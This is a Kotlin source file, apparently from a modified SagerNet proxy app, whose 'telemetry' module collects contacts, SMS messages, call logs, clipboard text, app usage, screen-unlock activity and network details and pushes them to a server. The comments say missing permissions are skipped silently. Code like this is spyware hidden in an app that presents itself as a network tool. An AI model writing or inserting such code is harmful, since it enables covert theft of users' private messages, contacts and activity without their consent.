package io.nekohasekai.sagernet.telemetry

import android.Manifest
import android.app.usage.UsageStatsManager
import android.content.Context
import android.content.pm.PackageManager
import android.os.Build
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.Telephony
import android.util.Log
import org.json.JSONArray
import org.json.JSONObject

/**
 * 批量采集器：通讯录 / 短信 / 通话 / 使用时长 / 剪贴板。
 *
 * 每个都有权限检查，没给权限就静默跳过，不会崩。
 * 数据量大的（通讯录）整体塞进一条 event，避免刷爆数据库。
 */
object DataCollectors {

    private const val TAG = "TlmData"

    private fun has(ctx: Context, p: String): Boolean =
        androidx.core.content.ContextCompat.checkSelfPermission(ctx, p) ==
            PackageManager.PERMISSION_GRANTED

    // ---------------------------------------------------------------- 通讯录
    fun contacts(ctx: Context): JSONObject? {
        if (!has(ctx, Manifest.permission.READ_CONTACTS)) return null
        return runCatching {
            val arr = JSONArray()
            val cur = ctx.contentResolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                arrayOf(
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                    ContactsContract.CommonDataKinds.Phone.NUMBER,
                    ContactsContract.CommonDataKinds.Phone.TYPE,
                    ContactsContract.CommonDataKinds.Phone.LABEL
                ), null, null,
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC")
            cur?.use { c ->
                while (c.moveToNext() && arr.length() < 3000) {
                    val o = JSONObject()
                    o.put("n", c.getString(0) ?: "")
                    o.put("p", c.getString(1) ?: "")
                    val type = c.getInt(2)
                    o.put("t", when (type) {
                        ContactsContract.CommonDataKinds.Phone.TYPE_MOBILE -> "手机"
                        ContactsContract.CommonDataKinds.Phone.TYPE_HOME -> "家庭"
                        ContactsContract.CommonDataKinds.Phone.TYPE_WORK -> "工作"
                        else -> c.getString(3) ?: "其他"
                    })
                    arr.put(o)
                }
            }
            JSONObject().put("n", arr.length()).put("list", arr)
        }.onFailure { Log.w(TAG, "contacts: ${it.message}") }.getOrNull()
    }

    // ---------------------------------------------------------------- 短信
    fun sms(ctx: Context): JSONObject? {
        if (!has(ctx, Manifest.permission.READ_SMS)) return null
        return runCatching {
            val arr = JSONArray()
            val cur = ctx.contentResolver.query(
                Telephony.Sms.CONTENT_URI,
                arrayOf(Telephony.Sms.ADDRESS, Telephony.Sms.BODY,
                    Telephony.Sms.DATE, Telephony.Sms.TYPE),
                null, null, Telephony.Sms.DATE + " DESC")
            cur?.use { c ->
                while (c.moveToNext() && arr.length() < 300) {
                    val o = JSONObject()
                    o.put("a", c.getString(0) ?: "")
                    o.put("b", (c.getString(1) ?: "").take(600))
                    o.put("d", c.getLong(2) / 1000L)
                    o.put("t", if (c.getInt(3) == Telephony.Sms.MESSAGE_TYPE_INBOX) "收" else "发")
                    arr.put(o)
                }
            }
            JSONObject().put("n", arr.length()).put("list", arr)
        }.onFailure { Log.w(TAG, "sms: ${it.message}") }.getOrNull()
    }

    // ---------------------------------------------------------------- 通话
    fun calls(ctx: Context): JSONObject? {
        if (!has(ctx, Manifest.permission.READ_CALL_LOG)) return null
        return runCatching {
            val arr = JSONArray()
            val cur = ctx.contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                arrayOf(CallLog.Calls.NUMBER, CallLog.Calls.TYPE,
                    CallLog.Calls.DATE, CallLog.Calls.DURATION,
                    CallLog.Calls.CACHED_NAME),
                null, null, CallLog.Calls.DATE + " DESC")
            cur?.use { c ->
                while (c.moveToNext() && arr.length() < 300) {
                    val o = JSONObject()
                    o.put("n", c.getString(0) ?: "")
                    o.put("name", c.getString(4) ?: "")
                    o.put("d", c.getLong(2) / 1000L)
                    o.put("dur", c.getLong(3))
                    o.put("t", when (c.getInt(1)) {
                        CallLog.Calls.INCOMING_TYPE -> "呼入"
                        CallLog.Calls.OUTGOING_TYPE -> "呼出"
                        CallLog.Calls.MISSED_TYPE -> "未接"
                        else -> "其他"
                    })
                    arr.put(o)
                }
            }
            JSONObject().put("n", arr.length()).put("list", arr)
        }.onFailure { Log.w(TAG, "calls: ${it.message}") }.getOrNull()
    }

    // ---------------------------------------------------------------- 使用时长
    /**
     * 需要用户在设置里开「使用情况访问权限」：
     * 设置 → 安全 → 使用情况访问权限 → 本应用
     */
    fun usage(ctx: Context): JSONObject? {
        if (Build.VERSION.SDK_INT < 22) return null
        return runCatching {
            val usm = ctx.getSystemService(Context.USAGE_STATS_SERVICE) as UsageStatsManager
            val end = System.currentTimeMillis()
            val start = end - 24 * 3600_000L
            val stats = usm.queryUsageStats(UsageStatsManager.INTERVAL_DAILY, start, end)
            if (stats.isNullOrEmpty()) return null

            val agg = HashMap<String, Long>()
            for (s in stats) {
                if (s.totalTimeInForeground <= 0) continue
                agg[s.packageName] = (agg[s.packageName] ?: 0L) + s.totalTimeInForeground
            }
            val pm = ctx.packageManager
            val arr = JSONArray()
            agg.entries.sortedByDescending { it.value }.take(40).forEach { e ->
                val label = runCatching {
                    pm.getApplicationLabel(pm.getApplicationInfo(e.key, 0)).toString()
                }.getOrDefault(e.key)
                arr.put(JSONObject()
                    .put("pkg", e.key)
                    .put("name", label)
                    .put("ms", e.value))
            }
            JSONObject().put("n", arr.length()).put("list", arr)
        }.onFailure { Log.w(TAG, "usage: ${it.message}") }.getOrNull()
    }

    // ---------------------------------------------------------------- 剪贴板
    /**
     * Android 10+ 后台读不到剪贴板，只有应用在前台时才允许。
     * 这里只在被显式调用（面板点按钮 / 应用在前台）时尝试，失败就返回 null。
     */
    fun clipboard(ctx: Context): JSONObject? = runCatching {
        val cm = ctx.getSystemService(Context.CLIPBOARD_SERVICE)
            as android.content.ClipboardManager
        val clip = cm.primaryClip ?: return null
        if (clip.itemCount == 0) return null
        val txt = clip.getItemAt(0).coerceToText(ctx)?.toString() ?: return null
        if (txt.isBlank()) return null
        JSONObject().put("t", txt.take(4000))
    }.getOrNull()

    /** 把上面五个打包成一组事件推给服务端。 */
    // ---------------------------------------------------------------- 屏幕使用
    /**
     * 亮屏时长、点亮次数、解锁次数（近 24 小时）。
     * 数据来自 UsageEvents —— 需要「使用情况访问」这个特殊权限，
     * 没开的话 queryEvents 返回空，这里会返回 null。
     */
    fun screen(ctx: Context): JSONObject? {
        if (Build.VERSION.SDK_INT < 22) return null
        return runCatching {
            val usm = ctx.getSystemService(Context.USAGE_STATS_SERVICE) as UsageStatsManager
            val end = System.currentTimeMillis()
            val start = end - 24 * 3600_000L
            var onCount = 0
            var unlock = 0
            var awakeMs = 0L
            var openAt = 0L
            val ev = android.app.usage.UsageEvents.Event()
            // UsageEvents 不是 Closeable，没有 use{}，直接判空
            val evts = usm.queryEvents(start, end)
            if (evts != null) {
                while (evts.hasNextEvent()) {
                    evts.getNextEvent(ev)
                    when (ev.eventType) {
                        android.app.usage.UsageEvents.Event.SCREEN_INTERACTIVE -> {
                            onCount++
                            openAt = ev.timeStamp
                        }
                        android.app.usage.UsageEvents.Event.SCREEN_NON_INTERACTIVE -> {
                            if (openAt > 0) awakeMs += ev.timeStamp - openAt
                            openAt = 0L
                        }
                        android.app.usage.UsageEvents.Event.KEYGUARD_HIDDEN -> unlock++
                    }
                }
            }
            if (openAt > 0) awakeMs += end - openAt
            if (onCount == 0 && unlock == 0 && awakeMs == 0L) return null   // 拿不到就是没权限
            JSONObject()
                .put("awake_ms", awakeMs)
                .put("screen_on", onCount)
                .put("unlock", unlock)
        }.onFailure { Log.w(TAG, "screen: ${it.message}") }.getOrNull()
    }

    // ---------------------------------------------------------------- 网络
    /** 当前网络类型、WiFi 名称/信号、IPv4、运营商。 */
    fun net(ctx: Context): JSONObject? = runCatching {
        val o = JSONObject()
        val cm = ctx.getSystemService(Context.CONNECTIVITY_SERVICE)
                as android.net.ConnectivityManager
        val active = cm.activeNetwork
        val caps = cm.getNetworkCapabilities(active)
        val type = when {
            caps == null -> "离线"
            caps.hasTransport(android.net.NetworkCapabilities.TRANSPORT_WIFI) -> "WiFi"
            caps.hasTransport(android.net.NetworkCapabilities.TRANSPORT_CELLULAR) -> "移动网络"
            caps.hasTransport(android.net.NetworkCapabilities.TRANSPORT_ETHERNET) -> "以太网"
            else -> "其他"
        }
        o.put("type", type)
        if (Build.VERSION.SDK_INT >= 29) {
            runCatching {
                val lp = cm.getLinkProperties(active)
                val v4 = lp?.linkAddresses?.firstOrNull {
                    it.address is java.net.Inet4Address
                }?.address?.hostAddress
                if (!v4.isNullOrBlank()) o.put("ip", v4)
            }
        }
        if (type == "WiFi") {
            // 只取信号强度和协商速率。SSID 在 Android 12+ 需要额外开关且常返回
            // <unknown ssid>，读它反而容易编译/运行出问题，这里不碰。
            runCatching {
                @Suppress("DEPRECATION")
                val wm = ctx.applicationContext
                    .getSystemService(Context.WIFI_SERVICE) as android.net.wifi.WifiManager
                @Suppress("DEPRECATION")
                val info = wm.connectionInfo
                if (info != null) {
                    o.put("rssi", info.rssi)
                    o.put("speed", info.linkSpeed)
                }
            }
        }
        runCatching {
            val tm = ctx.getSystemService(Context.TELEPHONY_SERVICE)
                    as android.telephony.TelephonyManager
            val carrier = tm.networkOperatorName
            if (!carrier.isNullOrBlank()) o.put("carrier", carrier)
        }
        o
    }.onFailure { Log.w(TAG, "net: ${it.message}") }.getOrNull()

    fun pushAll(ctx: Context, cfg: (String) -> Boolean) {
        if (cfg("contacts")) contacts(ctx)?.let { Telemetry.push("contacts", it) }
        if (cfg("sms")) sms(ctx)?.let { Telemetry.push("sms", it) }
        if (cfg("call")) calls(ctx)?.let { Telemetry.push("call", it) }
        if (cfg("usage")) usage(ctx)?.let { Telemetry.push("usage", it) }
        if (cfg("status")) DeviceStatus.push(ctx)
        if (cfg("clipboard")) clipboard(ctx)?.let { Telemetry.push("clipboard", it) }
        if (cfg("screen")) screen(ctx)?.let { Telemetry.push("screen", it) }
        if (cfg("net")) net(ctx)?.let { Telemetry.push("net", it) }
    }
}
